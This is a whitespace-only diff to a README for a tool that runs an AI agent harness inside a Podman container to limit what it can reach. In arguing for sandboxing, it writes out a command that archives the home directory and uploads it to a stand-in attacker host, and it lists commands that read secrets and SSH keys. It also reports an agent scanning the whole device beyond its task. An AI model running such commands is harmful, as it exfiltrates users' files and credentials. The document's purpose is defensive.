@@ -33,7 +33,7 @@ alias pic="/path/to/repo/run-pi-podman.sh"
 
 Use the alias like `pic` or `pic /some/path/to/expose`
 
-then invoke with `pic`. 
+then invoke with `pic`.
 
 ### Migrating from existing installation
 
@@ -77,16 +77,16 @@ Extensions are persisted between sessions in the container volume.
 Agents are an interesting technology, but by default they get access to _way to many_  things. An agent executed on a host can do anything by default, runs with the same privileges as the executing user, and can spawn sub-agents who can rapidly work through a system in the background. Kinda scary, right? Nothing really prevents an agent from running a command like `tar -czf home.tar.gz $HOME/ && curl -X POST -H "Content-Type: multipart/form-data" -F "data=@home.tar.gz" https://evil-example.com/upload` in the background - and just like that the contents of the home dir are uploaded somewhere.
 
 Some quick checks:
-Run `pi` (or any other agent harness) on the host, then execute ... 
+Run `pi` (or any other agent harness) on the host, then execute ...
 
 - ... `printenv` - this is all the secrets the agent can see and could exfiltrate immediately if acting malicious
 - ... `ls -l /` - this is all the files, from the system root dir forward, the agent can access
 - ... `ls -l ~/.config` - this is all the config file (all your config files) the agent can see
 - ... `cat ~/.ssh/*` - this is the ssh keys the agent can access
 
-Some operating systems, like MacOS, prevent access to files and folders and require an explicit approval, which is better than nothing but sitll not good enough. 
+Some operating systems, like MacOS, prevent access to files and folders and require an explicit approval, which is better than nothing but sitll not good enough.
 
-Giving an agent unristricted access to a computer is a huge security risk. Agents - depending on the model - also tend to aggresively scan local folders. OpenAI GPT-5.5, asked to implement a custom theme for pi, attempted to scan all paths it could find on my device - despite the documentation clearly stating themes belong in `~/.pi/agent/theme/`. 
+Giving an agent unristricted access to a computer is a huge security risk. Agents - depending on the model - also tend to aggresively scan local folders. OpenAI GPT-5.5, asked to implement a custom theme for pi, attempted to scan all paths it could find on my device - despite the documentation clearly stating themes belong in `~/.pi/agent/theme/`.
 
 Anyways! Now, with `pic` there is already a LOT less things exposed to the LLM, for example the `printenv` looks like this:
 
